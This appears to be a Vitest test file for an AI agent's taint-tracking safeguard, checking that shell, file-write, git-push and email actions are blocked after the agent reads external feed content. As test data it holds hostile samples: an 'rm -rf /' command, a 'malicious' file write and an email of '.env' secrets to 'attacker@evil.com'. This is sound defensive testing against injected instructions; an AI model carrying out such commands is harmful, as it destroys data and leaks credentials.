/**
 * Test taint tracking security feature
 * Verifies that dangerous capabilities are blocked after fetching external content
 */

import { describe, it, expect, beforeEach } from 'vitest';
import { capabilityExecutor } from '../src/services/capability/capability-executor.js';
import { OrchestrationContext, ExtractedCapability } from '../src/types/orchestration-types.js';

describe('Taint Tracking Security', () => {
  let context: OrchestrationContext;

  beforeEach(() => {
    context = {
      messageId: 'test-123',
      userId: 'test-user',
      originalMessage: 'test message',
      source: 'test',
      capabilities: [],
      results: [],
      currentStep: 0,
      respondTo: async () => {},
      capabilityFailureCount: new Map(),
      taintedByExternalContent: false,
      taintSource: undefined,
    };
  });

  describe('when context is NOT tainted', () => {
    it('should allow shell capability', async () => {
      const shellCap: ExtractedCapability = {
        name: 'shell',
        action: 'exec',
        params: { command: 'echo hello' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        shellCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      // Should attempt execution (may fail for other reasons, but not taint block)
      expect(result.error).not.toContain('SECURITY');
      expect(result.error).not.toContain('tainted');
    });
  });

  describe('when context IS tainted', () => {
    beforeEach(() => {
      context.taintedByExternalContent = true;
      context.taintSource = 'moltbook:feed';
    });

    it('should block shell capability', async () => {
      const shellCap: ExtractedCapability = {
        name: 'shell',
        action: 'exec',
        params: { command: 'rm -rf /' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        shellCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('SECURITY');
      expect(result.error).toContain('tainted');
      expect(result.error).toContain('moltbook:feed');
    });

    it('should block filesystem write but allow read', async () => {
      const writeCap: ExtractedCapability = {
        name: 'filesystem',
        action: 'write',
        params: { path: '/tmp/evil.txt', content: 'malicious' },
        priority: 0,
      };

      const writeResult = await capabilityExecutor.executeCapability(
        writeCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(writeResult.success).toBe(false);
      expect(writeResult.error).toContain('SECURITY');

      // Read should be allowed
      const readCap: ExtractedCapability = {
        name: 'filesystem',
        action: 'read',
        params: { path: '/tmp/test.txt' },
        priority: 0,
      };

      const readResult = await capabilityExecutor.executeCapability(
        readCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      // Should not be blocked by taint (may fail for other reasons)
      expect(readResult.error || '').not.toContain('SECURITY');
      expect(readResult.error || '').not.toContain('tainted');
    });

    it('should block git push but allow git status', async () => {
      const pushCap: ExtractedCapability = {
        name: 'git',
        action: 'push',
        params: {},
        priority: 0,
      };

      const pushResult = await capabilityExecutor.executeCapability(
        pushCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(pushResult.success).toBe(false);
      expect(pushResult.error).toContain('SECURITY');

      // Status should be allowed
      const statusCap: ExtractedCapability = {
        name: 'git',
        action: 'status',
        params: {},
        priority: 0,
      };

      const statusResult = await capabilityExecutor.executeCapability(
        statusCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(statusResult.error || '').not.toContain('SECURITY');
    });

    it('should allow moltbook capability (non-dangerous)', async () => {
      const moltbookCap: ExtractedCapability = {
        name: 'moltbook',
        action: 'browse',
        params: {},
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        moltbookCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      // Should not be blocked by taint
      expect(result.error || '').not.toContain('SECURITY');
      expect(result.error || '').not.toContain('tainted');
    });

    it('should block email capability', async () => {
      const emailCap: ExtractedCapability = {
        name: 'email',
        action: 'send',
        params: { to: 'attacker@evil.com', subject: 'secrets', body: 'your .env' },
        priority: 0,
      };

      const result = await capabilityExecutor.executeCapability(
        emailCap,
        context,
        (cap, err) => `Error: ${err}`
      );

      expect(result.success).toBe(false);
      expect(result.error).toContain('SECURITY');
    });
  });
});
